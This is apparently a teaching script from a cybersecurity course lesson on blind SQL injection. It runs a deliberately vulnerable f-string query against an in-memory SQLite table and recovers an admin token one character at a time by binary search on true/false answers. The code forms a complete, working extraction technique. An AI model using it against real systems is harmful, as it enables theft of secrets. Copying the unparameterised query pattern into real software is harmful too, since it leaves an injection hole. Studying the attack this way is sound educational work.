# 1.2 Injection: SQL, blind SQL, commands, SSRF and paths
# Example "blind_sqli" from the lesson.
# From the Brainy Bytes Cybersecurity subject. Run it with: python3 <this file>
# Every attack here runs on made up data on your own computer. Never point it at a system you do not own.

# Blind SQL injection: the page only says "found" or "not found", yet a secret leaks one character at a time.
# Binary search on character codes needs about log2(95) = 6.6 questions per printable character.
import math, sqlite3

db = sqlite3.connect(":memory:")
db.executescript("CREATE TABLE users (name TEXT, token TEXT); INSERT INTO users VALUES ('admin', 'K9#qz');")
questions = 0

def page_says_found(injected):                    # the only thing the attacker sees: True or False
    global questions
    questions += 1
    sql = f"SELECT 1 FROM users WHERE name = 'nobody' OR ({injected})"
    return bool(db.execute(sql).fetchall())

def leak_char(pos):
    lo, hi = 32, 126                              # printable ASCII
    while lo < hi:
        mid = (lo + hi) // 2
        if page_says_found(f"unicode(substr((SELECT token FROM users WHERE name='admin'), {pos}, 1)) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

length = next(n for n in range(1, 50) if page_says_found(f"length((SELECT token FROM users WHERE name='admin')) = {n}"))
print("token length found after", questions, "questions:", length)
secret = ""
for pos in range(1, length + 1):
    secret += leak_char(pos)
    print(f"after {questions:3} questions: {secret}")
print(f"binary search: about {math.ceil(math.log2(95))} questions per character, linear guessing up to 95")
